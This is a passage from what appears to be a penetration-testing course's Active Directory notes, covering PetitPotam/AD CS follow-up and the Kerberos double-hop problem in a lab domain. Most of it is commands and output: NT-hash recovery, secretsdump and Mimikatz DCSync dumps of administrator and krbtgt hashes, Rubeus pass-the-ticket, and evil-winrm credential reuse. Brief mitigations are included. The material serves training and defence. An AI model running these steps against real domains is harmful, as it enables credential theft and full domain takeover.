x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\n</code></pre> <p>From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.</p>  Submitting a TGS Request for Ourselves Using getnthash.py <p>We can also take an alternate route once we have the TGT for our target. Using the tool <code>getnthash.py</code> from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.</p> <pre><code>secops@kali[/kali]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 legalcorp.local/ACADEMY-EA-DC01$\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[*] Using TGT from cache\n[*] Requesting ticket to self with PAC\nRecovered NT Hash\n313b6f423cd1ee07e91315b4919fb4ba\n</code></pre> <p>We can then use this hash to perform a DCSync with secretsdump.py using the <code>-hashes</code> flag.</p> <pre><code>secops@kali[/kali]$ secretsdump.py -just-dc-user LEGALCORP/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nlegalcorp.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\nlegalcorp.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\nlegalcorp.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\nlegalcorp.local\\administrator:des-cbc-md5:70add6e02f70321f\n[*] Cleaning up...\n</code></pre> <p>Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.</p> <p>Requesting TGT and Performing PTT with DC01$ Machine Account <pre><code>PS C:\\Tools&gt; .\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate: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 /ptt\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n[*] Action: Ask TGT\n\n[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.legalcorp.local\n[*] Building AS-REQ (w/ PKINIT preauth) for: 'legalcorp.local\\ACADEMY-EA-DC01$'\n[*] Using domain controller: 172.16.5.5:88\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D\n      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC\n      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC\n      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P\n      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH\n      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame\n      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ\n      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89\n      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq\n      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE\n      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb\n      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4\n      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6\n      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n\n      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP\n      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw\n      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe\n      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN\n      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL\n      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3\n      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U\n      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k\n      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw\n      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ\n      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR\n      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ\n      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM\n[+] Ticket successfully imported!\n\n  ServiceName              :  krbtgt/legalcorp.local\n  ServiceRealm             :  legalcorp.local\n  UserName                 :  ACADEMY-EA-DC01$\n  UserRealm                :  legalcorp.local\n  StartTime                :  3/30/2022 3:50:25 PM\n  EndTime                  :  3/31/2022 1:50:25 AM\n  RenewTill                :  4/6/2022 3:50:25 PM\n  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType                  :  rc4_hmac\n  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==\n  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD\n</code></pre></p> <p>Confirming the Ticket is in Memory <pre><code>PS C:\\Tools&gt; klist\n\nCurrent LogonId is 0:0x4e56b\n\nCached Tickets: (3)\n\n#0&gt;     Client: ACADEMY-EA-DC01$ @ legalcorp.local\n        Server: krbtgt/legalcorp.local @ legalcorp.local\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize\n        Start Time: 3/30/2022 15:53:09 (local)\n        End Time:   3/31/2022 1:50:25 (local)\n        Renew Time: 4/6/2022 15:50:25 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x2 -&gt; DELEGATION\n        Kdc Called: ACADEMY-EA-DC01.legalcorp.local\n\n#1&gt;     Client: ACADEMY-EA-DC01$ @ legalcorp.local\n        Server: krbtgt/legalcorp.local @ legalcorp.local\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize\n        Start Time: 3/30/2022 15:50:25 (local)\n        End Time:   3/31/2022 1:50:25 (local)\n        Renew Time: 4/6/2022 15:50:25 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x1 -&gt; PRIMARY\n        Kdc Called:\n\n#2&gt;     Client: ACADEMY-EA-DC01$ @ legalcorp.local\n        Server: cifs/academy-ea-dc01 @ legalcorp.local\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 3/30/2022 15:53:09 (local)\n        End Time:   3/31/2022 1:50:25 (local)\n        Renew Time: 4/6/2022 15:50:25 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0\n        Kdc Called: ACADEMY-EA-DC01.legalcorp.local\n</code></pre></p> <p>Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync.</p> <pre><code>PS C:\\Tools&gt; cd .\\mimikatz\\x64\\\nPS C:\\Tools\\mimikatz\\x64&gt; .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /user:LEGALCORP\\krbtgt\n[DC] 'legalcorp.local' will be the domain\n[DC] 'ACADEMY-EA-DC01.legalcorp.local' will be the DC server\n[DC] 'LEGALCORP\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 10/27/2021 8:14:34 AM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc\n    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc\n    lm  - 0: 4562458c201a97fa19365ce901513c21\n</code></pre>  PetitPotam Mitigations <p>The patch for CVE-2021-36942 should be applied to any affected hosts. Further steps:</p> <ul> <li>To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services</li> <li> Disabling NTLM authentication for Domain Controllers</li> <li>Disabling NTLM on AD CS servers using Group Policy </li> <li>Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use</li> </ul> <p>For more reading on attacking Active Directory Certificate Services, whitepaper Certified Pre-Owned as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.</p>","title":"Vulnerabilities"},{"location":"active_directory/stacking_the_deck/kerberos_double_hop/","text":"<p>Let's say we have three hosts: <code>Attack host</code> --&gt; <code>DEV01</code> --&gt; <code>DC01</code>. Our Attack Host is within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the <code>Remote Management Users</code> group on DEV01. We want to use <code>PowerView</code> to enumerate the domain, which requires communication with the Domain Controller, DC01.</p> <p>When we connect to <code>DEV01</code> using a tool such as <code>evil-winrm</code>, we connect with network authentication, so our credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of our user. When we load a tool such as <code>PowerView</code> and attempt to query Active Directory, Kerberos has no way of telling the DC that our user can access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.</p> <p>If unconstrained delegation is enabled on a server, it is likely we won't face the \"Double Hop\" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGS Ticket is cached, which has the ability to sign TGTs and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.</p>  Workarounds <p>We can also connect to the remote host via host A and set up a PSCredential object to pass our credentials again.</p> <p>After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; import-module .\\PowerView.ps1\n\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; get-domainuser -spn\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = $UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : DirectoryServicesCOMException\n</code></pre> <p>If we check with <code>klist</code>, we see that we only have a cached Kerberos ticket for our current server. <pre><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; klist\n\nCurrent LogonId is 0:0x57f8a\n\nCached Tickets: (1)\n\n#0&gt; Client: backupadm @ legalcorp.local\n    Server: academy-aen-ms0$ @\n    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n    Ticket Flags 0xa10000 -&gt; renewable pre_authent name_canonicalize\n    Start Time: 6/28/2022 7:31:53 (local)\n    End Time:   6/28/2022 7:46:53 (local)\n    Renew Time: 7/5/2022 7:31:18 (local)\n    Session Key Type: AES-256-CTS-HMAC-SHA1-96\n    Cache Flags: 0x4 -&gt; S4U\n    Kdc Called: DC01.legalcorp.local\n</code></pre></p> <p>Set up a PSCredential object and try again. First, we set up our authentication.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force\n\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt;  $Cred = New-Object System.Management.Automation.PSCredential('LEGALCORP\\backupadm', $SecPassword)\n</code></pre> <p>Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command. <pre><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; get-domainuser -spn -credential $Cred | select samaccountname\n\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n\nsamaccountname\n--------------\nazureconnect\nbackupjob\nkrbtgt\nmssqlsvc\nsqltest\nsqlqa\nsqldev\nmssqladm\nsvc_sql\nsqlprod\nsapsso\nsapvc\nvmwarescvc\n</code></pre></p> <p>If we try again without specifying the <code>-credential</code> flag, we once again get an error message. <pre><code>get-domainuser -spn | select \n\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; get-domainuser -spn 